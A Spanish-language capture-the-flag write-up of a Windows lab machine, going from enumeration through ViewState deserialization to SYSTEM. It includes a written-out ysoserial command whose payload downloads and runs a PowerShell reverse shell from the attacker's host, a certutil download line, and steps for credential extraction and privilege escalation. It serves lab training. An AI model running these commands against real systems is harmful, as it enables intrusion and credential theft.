### Ping
#windows #medium
```python
ping -c 1 10.10.11.251
PING 10.10.11.251 (10.10.11.251) 56(84) bytes of data.
64 bytes from 10.10.11.251: icmp_seq=1 ttl=127 time=157 ms

--- 10.10.11.251 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.729/156.729/156.729/0.000 ms
```

### TTL 127= Windows
### nmap
```python
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds
```
obtenemos el nombre de dominio del host y lo agregamos al /etc/hosts

### Enumeración del puerto http (80)

![[Pasted image 20240310205202.png]]

### Fuzzing con wfuzz (Directorios)
no obtenemos nada interesante por el momento
![[Pasted image 20240310205503.png]]

### Fuzzing con wfuzz (Subdominios)
encontramos un subdominio sospechoso. lo agregamos al /etc/hosts
![[Pasted image 20240310210838.png]]

### Web dev.pov.htb

![[Pasted image 20240311105847.png]]

### BurpSuite
interceptamos la petición de download cv
![[Pasted image 20240310212727.png]]
cambiamos el EVENTVALIDATION= cv.pdf por = /web.config. esto nos muestra información de la pagina la cual la hace vulnerable a una explotacion de VIEWSTATE

### Vulnerabilidad Exploiting __VIEWSTATE
![[Pasted image 20240311105353.png]]
usaremos la herramienta YSoSerial.Net esta herramienta es para maquina windows asi que debes tener una maquina windows donde poder ejecutar esto (tambien puedes ejecutarlo desde kali linux pero debes complementarlo con otras herramientas)

### YSoSerial.Net
usaremos la siguiente sintax
```python
C:\FilesExplotation\ysoserial-1.34\Release>.\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.64/Invoke-PowerShellTcp.ps1')" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

![[Pasted image 20240311110529.png]]

### Invoke-PowerShelltcp
ahora usaremos el invoke-powershell para invocar automaticamente esta shell. al final del codigo debemos agregar la siguiente linea 

```python
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
```

![[Pasted image 20240311110955.png]]

### Servidor con python
estaremos compartiendo este archivo en un servidor con python
![[Pasted image 20240311110845.png]]

### BurpSuite
finalmente usaremos el codigo que hemos generado con el YSoSerial.Net intectandolo en el parametro **VIESTATE** 
Nota: el codigo debe ir URLEncode puede hacerlo desde burpsuite seleccionando el codigo y presionando CTRL + U 
![[Pasted image 20240311111432.png]]
### rlwrap
estaremos a la escucha con rlwrap para recibir nuestra reverse shell
![[Pasted image 20240311105747.png]]

### xml

![[Pasted image 20240311112314.png]]
En este archivo obtenemos otro Usuario llamado **alaading** y la contraseña codificada.

### Import-Clixml 
con (import-clixml conennection.xml).GetNetworkCredential() | fl  podemos extraer los datos de ese archivo xml
![[Pasted image 20240311175136.png]]

### Servidor con python 
ahora vamos a descargar RunasCs.exe, psgetsys.ps1 y EnableAllTokenPrivs.ps1
estaremos compartiendo todos estos archivos en nuestro servidor para poder subirlos a la maquina victima
![[Pasted image 20240311181743.png]]

### certutil.exe
usaremos la herramienta certutil para poder descargar los archivos a la maquina victima
```python
certutil.exe -urlcache -split -f "http://10.10.14.64/RunasCs.exe" ".\RunasCs.exe"
```
![[Pasted image 20240311182044.png]]

### RunasCs.exe
ejecutamos RunasCs con las credenciales que hemos conseguido llamamos una cmd.exe en nuestra dirección IP y el puerto
![[Pasted image 20240311182556.png]]

### rlwrap 
hemos conseguido una nueva conexión con las credenciales de alaading
![[Pasted image 20240311183935.png]]

### Escalada de privilegios
podemos ver que el privilegio "SeDebugPrivilege" ha sido deshabilitado
![[Pasted image 20240311184829.png]]

### sfitz
ejecutamos los script que hemos subido anteriormente y procedemos a la escalada 
![[Pasted image 20240311190250.png]]

### msfvenom
creamos un exploit con msfvenom para iniciar una reverse shell como nt\system y lo vamos a subir a la maquina victima con un servidor en python
![[Pasted image 20240311190718.png]]

### exploit.exe 
subimos el archivo a la maquina victima y ejecutamos .\exploit.exe 
![[Pasted image 20240311194312.png]]

### msfconsole
vamos a setear todos los parametros de multi/handler y ejecutamos el .\exploit.exe
![[Pasted image 20240311200351.png]]

### PID
aqui tendremos el PID del winlogon.exe y ahora solo debemos migrar a este PID
![[Pasted image 20240311200502.png]]

### migrate 
hacemos la migración al PID luego llamamos una shell y tenemos acceso como nt autority\system
![[Pasted image 20240311201120.png]]

### WE ARE ROOT
